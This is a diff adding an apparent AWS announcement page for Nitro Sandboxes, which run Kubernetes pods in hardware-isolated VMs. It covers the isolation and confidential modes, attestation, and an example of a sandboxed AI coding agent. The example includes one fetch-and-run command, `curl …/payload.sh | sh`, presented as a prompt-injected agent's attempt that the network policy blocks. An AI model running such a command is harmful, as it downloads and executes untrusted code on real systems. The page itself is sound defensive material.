@@ -1,0 +1,54 @@
+<h1>AWS Nitro Sandboxes: Hardware-enforced workload isolation on Amazon EKS</h1>
+<p>Run agentic AI, multi-tenant SaaS, and regulated workloads with the isolation of a dedicated Amazon Elastic Compute Cloud (Amazon EC2) instance and the simplicity of a Kubernetes pod. Nitro Sandboxes give each pod a hardware-enforced security boundary, built on the same Nitro System that isolated EC2 instances from each other.</p>
+<h2>The problem: Why isolation matters now</h2>
+<p>Kubernetes containers share a host operating system. That’s what makes them fast and lightweight, but it also means that a vulnerability in one container can compromise every other container on the same machine. The typical workaround is to give each sensitive workload its own dedicated machine. It works, but it’s expensive, because most of that machine sits idle, and you’re paying for security with wasted infrastructure.</p>
+<p>Several trends are making this workaround unsustainable:</p>
+<ul>
+ <li><strong>AI agents are writing and running their own code:</strong> No human reviews it before it executes. If untrusted code breaks out from the container, a single malicious prompt can escalate into a lateral movement on the host, granting access to read secrets and poison container images.</li>
+ <li><strong>SaaS platforms are running with hundreds of customers on shared clusters:</strong> Dedicating an entire Amazon EC2 instance per customer is cost prohibitive. ISVs need a way to safely share infrastructure while helping prevent one customer from accessing another’s data or starving their resources.</li>
+ <li><strong>Regulated industries need proof, not promises:</strong> Healthcare organizations subject to HIPAA, financial institutions governed by PCI DSS and SOX, and government agencies bound by FedRAMP increasingly require cryptographic evidence that a workload ran untampered. Auditors evaluating compliance with these frameworks now ask for cryptographic attestation rather than configuration checklists.</li>
+ <li><strong>CI/CD and container builds run with elevated privileges:</strong> These give them broad access to the host, requiring dedicated machines to contain the risk.</li>
+</ul>
+<p>Each of these workarounds depends on keeping a shared kernel patched and spending more on infrastructure to keep workloads apart. A better approach is an architecture where a kernel issue in one workload cannot reach another in the first place, so you don’t have to trade efficiency for isolation. Autonomous AI agents now probe, adapt, and chain exploits at machine speed, turning every shared-kernel weakness into an attack surface that no human team can patch fast enough. What if the trade-off between efficiency and safety is no longer required?</p>
+<h2>What we are launching</h2>
+<p>Today we are launching AWS Nitro Sandboxes for Amazon Elastic Kubernetes Service (Amazon EKS), and with it, pods get strong security isolation for the first time.</p>
+<p>Every sandboxed pod runs inside its own lightweight virtual machine, powered by the same AWS Nitro System that keeps every EC2 instance isolated from the others. Each pod gets its own operating system, completely separate from the host and from every neighbor. If something goes wrong inside the pod, no syscall can reach anything outside the guest kernel. Any workload that needs strong isolation now gets a hardware boundary, without dedicating a machine to each one.</p>
+<p>On EKS Auto Mode, enabling Nitro Sandboxes is a one-line change to your pod spec. You don’t change your container images, deployment pipelines, or Helm charts. Your pods still use the same AWS Identity and Access Management (IAM) credentials, the same storage, the same monitoring, the same networking, and the same security tools. <code>kubectl exec</code>, <code>kubectl logs</code>, and <code>kubectl port-forward</code> work identically.</p>
+<p>Because each sandbox runs a full operating system kernel, applications run as they would in a standard container. AWS Nitro Sandboxes passes every Kubernetes conformance test.</p>
+<h2>How it works</h2>
+<p>Nitro Sandboxes change two things at once: how isolated a pod is, and how predictably it shares a node.</p>
+<h3>You no longer choose between security and efficiency</h3>
+<p>Until now, strong isolation meant one workload per machine. With Nitro Sandboxes, you can pack many isolated pods onto a single node, each with its own VM boundary. Packing pods together raises a second question: can one pod slow down its neighbors? Each sandbox runs in its own slice of CPU and memory, and the Nitro Hypervisor enforces that slice in hardware, so neither the EC2 host nor neighbor pods can read its memory or CPU state. The resources that pods still share on the node, such as network bandwidth, disk I/O, DNS queries, log output, and connection tracking (conntrack) entries, are protected by default with configurable throttles. A runaway agent, a heavy build job, or one busy tenant hits its own limits before it affects the pods next to it.</p>
+<h3>Two modes</h3>
+<p><strong>Isolated mode</strong> puts each pod in its own virtual machine. The goal is to protect the host and neighboring pods from anything that happens inside the container.</p>
+<p><strong>Confidential mode</strong> goes further. It treats even the machine operator as untrusted. Cryptographic attestation proves the exact code running inside the sandbox, and AWS Key Management Service (AWS KMS) only allows decryption when presented with an attestation document that attests to the system image and the configured Cedar policy. The design prevents a cluster administrator from reading the pod’s memory.</p>
+<p><strong>What happens when the pod starts.</strong> The Nitro System is the hardware and hypervisor that runs every EC2 instance. It isolates instances from each other and from the host in dedicated hardware, not in software you must configure. Nitro Sandboxes builds on a new EC2 capability, which lets the Nitro Hypervisor carve a hardware-isolated slice of CPU and memory out of a running instance. Amazon EKS uses that slice to give each sandboxed pod its own lightweight VM. From the pod’s point of view, the sequence is short:</p>
+<ol>
+ <li><strong>The scheduler places the pod as usual.</strong></li>
+ <li><strong>Amazon EKS boots a lightweight VM for the pod.</strong> Instead of starting the containers on the node’s kernel, the container runtime asks EC2 for a Nitro Partition and boots a VM inside it.</li>
+ <li><strong>Your containers start inside the VM, unchanged.</strong> An in-guest component receives the pod spec and its Cedar policy, checks that what is about to run is what the policy allows, pulls the images, and starts the containers with a standard container runtime.</li>
+ <li><strong>Kubernetes sees a normal pod.</strong> Logs, exec, port-forward, probes, and metrics flow back to the kubelet over an internal control channel.</li>
+</ol>
+<p><strong>Confidential mode adds attestation to that flow.</strong> The Nitro Security Module measures what booted inside the sandbox and signs an attestation document that your workload presents to AWS KMS, so a secret is released only to a sandbox running the image and policy you expect.</p>
+<h2>Getting started</h2>
+<p>The fastest path is EKS Auto Mode, where the runtime classes are present on every cluster. If you run standard EKS with your own node groups or Karpenter, the same pod specs work once your nodes run a sandbox-enabled AMI.</p>
+<h3>A real workload: Why it’s important</h3>
+<p>This example shows why it matters. It runs a real AI coding agent that reads a GitHub issue, writes a fix, runs tests, and opens a pull request, all inside a Nitro Sandbox where the blast radius of anything the agent does is one VM that gets deleted when the job is done.</p>
+<ul>
+ <li><strong>Model access:</strong> Amazon Bedrock through Pod Identity.</li>
+ <li><strong>Repo access:</strong> one GitHub repository through a short-lived, fine-grained token mounted as a Secret.</li>
+ <li><strong>Everything else is denied:</strong> an EKS Auto Mode <code>ApplicationNetworkPolicy</code> allows egress only to CoreDNS and to HTTPS on the Bedrock and GitHub hostnames.</li>
+</ul>
+<p>If the agent gets prompt-injected and tries to run <code>curl https://example.com/payload.sh | sh</code>, the connection never opens: example.com is not on the egress list. When the pod exits, the VM is destroyed, so no state leaks into the next run.</p>
+<h2>Integrations: Where Nitro Sandboxes fits</h2>
+<p>Nitro Sandboxes is a Kubernetes RuntimeClass, not a new API. Any tool, controller, or platform that renders a pod template can run its workloads inside a hardware-isolated VM by setting one field.</p>
+<ul>
+ <li><strong>Agent frameworks and coding harnesses</strong> work as-is.</li>
+ <li><strong>Warm pools for interactive workloads</strong> via the Kubernetes SIG project agent-sandbox.</li>
+ <li><strong>Self-hosted managed agents</strong> where the reasoning loop stays in the cloud but tool execution runs on your infrastructure.</li>
+ <li><strong>CI/CD and AI software factories</strong> where untrusted build jobs run inside a per-pod VM.</li>
+ <li><strong>Durable orchestration</strong> like Temporal, which can provision a VM per task.</li>
+ <li><strong>Remote IDEs and multi-tenant SaaS</strong> giving each user a full IDE or tenant environment in a VM they cannot escape.</li>
+</ul>
+<h2>Try it today</h2>
+<p>Nitro Sandboxes for Amazon EKS is available today in all AWS Commercial Regions on all Nitro-enabled instance families: Intel, AMD, and Graviton. On EKS Auto Mode, the runtime classes ship with every cluster. Add <code>runtimeClassName: isolated-sandbox</code> to your next pod spec and you’re running inside a hardware-enforced boundary in under a minute.</p>
